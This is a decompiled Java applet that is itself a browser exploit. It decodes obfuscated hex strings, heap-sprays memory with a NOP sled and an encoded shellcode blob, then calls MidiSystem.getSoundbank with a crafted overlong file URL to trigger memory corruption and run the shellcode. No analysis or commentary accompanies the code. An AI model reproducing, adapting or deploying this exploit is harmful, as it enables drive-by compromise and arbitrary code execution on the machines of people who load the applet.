import java.nio.IntBuffer;
import java.util.regex.Pattern;
import javax.sound.midi.MidiSystem;
import java.net.URL;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class vmain extends Applet
{
    static String a;
    
    public void init() {
        String s = HS("G66696C653A2F2F");
        for (int i = 0; i < 302; ++i) {
            s += "/";
        }
        final String string = s + HS("G5A255A255A255A255A255A25I");
        try {
            this.mspray(HD(vmain.a), HD("G909I09090"));
            MidiSystem.getSoundbank(new URL(string));
            while (true) {
                Thread.sleep(10L);
            }
        }
        catch (Exception ex) {}
    }
    
    public static byte[] HB(String hc) {
        final byte[] array = new byte[(hc = HC(hc)).length() / 2];
        for (int i = 0; i < hc.length(); i += 2) {
            array[i / 2] = (byte)((Character.digit(hc.charAt(i), 16) << 4) + Character.digit(hc.charAt(i + 1), 16));
        }
        return array;
    }
    
    public static String HS(String hc) {
        hc = HC(hc);
        String string = new String();
        for (int i = 0; i < hc.length(); i += 2) {
            string += (char)((Character.digit(hc.charAt(i), 16) << 4) + Character.digit(hc.charAt(i + 1), 16));
        }
        return string;
    }
    
    public static short[] HD(String hc) {
        final short[] array = new short[(hc = HC(hc)).length() / 2];
        for (int i = 0; i < hc.length(); i += 2) {
            array[i / 2] = (short)(((Character.digit(hc.charAt(i), 16) & 0xFF) << 4) + (Character.digit(hc.charAt(i + 1), 16) & 0xFF));
        }
        return array;
    }
    
    public static String HC(final String s) {
        new String();
        return Pattern.compile("[G-Z]").matcher(s).replaceAll("");
    }
    
    public final IntBuffer[] mspray(final short[] array, final short[] array2) {
        final int n = 1048576;
        final int n2 = 1048576 / 4 - array.length;
        final IntBuffer[] array3 = new IntBuffer[50];
        for (int i = 0; i < 50; ++i) {
            final IntBuffer allocate = IntBuffer.allocate(n / 4);
            for (int j = 0; j < n2; ++j) {
                allocate.put(array2[0] | array2[1] << 8 | array2[2] << 16 | array2[3] << 24);
            }
            int k = 0;
            while (k < array.length) {
                allocate.put(array[k++] | array[k++] << 8 | array[k++] << 16 | array[k++] << 24);
            }
            array3[i] = allocate;
        }
        return array3;
    }
    
    static {
        vmain.a = "Gdad7dI97424f45abde3a0e4f529c9b138316a19036a1983eafc0155181d4c96e1de2e1e04ef7c444c42b00e006f3b42b1e4494bb64de7adf94ec671558c490ea4c1a92f6714a8689ad7f821d04aec46a4560d89a2e775ac7593cfafa50c44e75d2602d85ceb51241680a1dea940f81f98ac561e1421a76693dad29ce767e46695b3617b3d37d15fbf948714b351cc73d0640108eceda4df64b582fb2d6dab5a88c0d4bd74bc70b597a90294fd2c87a2bb2f97aceb47a627641f37e2c0ef72af6178da2530e5dd9377105d1608e77d530da33a8f7fbcaeaf2cbdfbdda129777f66c2030b1628c4dcbf2162516ed4f7e1414b986db1f8141ba3fe7d5f45I";
    }
}
